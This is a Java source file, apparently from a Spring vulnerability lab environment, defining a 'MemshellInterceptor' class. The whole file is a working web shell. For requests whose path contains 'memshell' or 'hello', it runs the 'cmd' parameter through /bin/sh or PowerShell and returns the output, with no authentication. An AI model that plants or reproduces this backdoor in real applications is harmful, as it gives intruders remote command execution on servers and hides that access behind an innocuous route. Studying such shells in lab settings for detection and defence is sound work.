package spring.vul.springvulenv.interceptor;

import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.nio.charset.Charset;
import java.util.Scanner;

@Component
public class MemshellInterceptor implements HandlerInterceptor {
    String defaultCharSet = "utf-8";
    String cmdTemplate = "%s";//chcp 65001&

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String uri = request.getRequestURI();// /Spring_Vul_Env_war/hello
        if (uri.contains("memshell") || uri.contains("hello")) {
            String result = shell(request, response);
            PrintWriter writer =  response.getWriter();
            writer.write(result);
            writer.flush();
            writer.close();
        }
        return true;
    }


    @ResponseBody
    public String shell(HttpServletRequest request, HttpServletResponse response) {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                String charSet = request.getParameter("charset");
                if (charSet != null) {
                    charSet = charSet.trim();
                } else {
                    charSet = new String();
                }
                String[] cmds = null;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", String.format(cmdTemplate, request.getParameter("cmd"))};
                } else {
                    cmds = new String[]{"powershell", "/C", String.format(cmdTemplate, request.getParameter("cmd"))};
                }
                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                InputStreamReader reader = new InputStreamReader(inputStream, charSet.isEmpty() ? Charset.forName(defaultCharSet) : Charset.forName(charSet));
                Scanner scanner = new Scanner(reader).useDelimiter("\\A");
                StringBuilder stringBuilder = new StringBuilder();
                while (scanner.hasNextLine()) {
                    stringBuilder.append(scanner.nextLine());
                }
                String result = stringBuilder.toString();
                return result;
//                    response.getWriter().println(result);
            } catch (Exception e) {
                //                        response.getWriter().println("Exception:" + e.getClass().getName() + e.getMessage());
                return ("Exception:" + e.getClass().getName() + e.getMessage());
            }
        }
        return "Complete";
    }
}
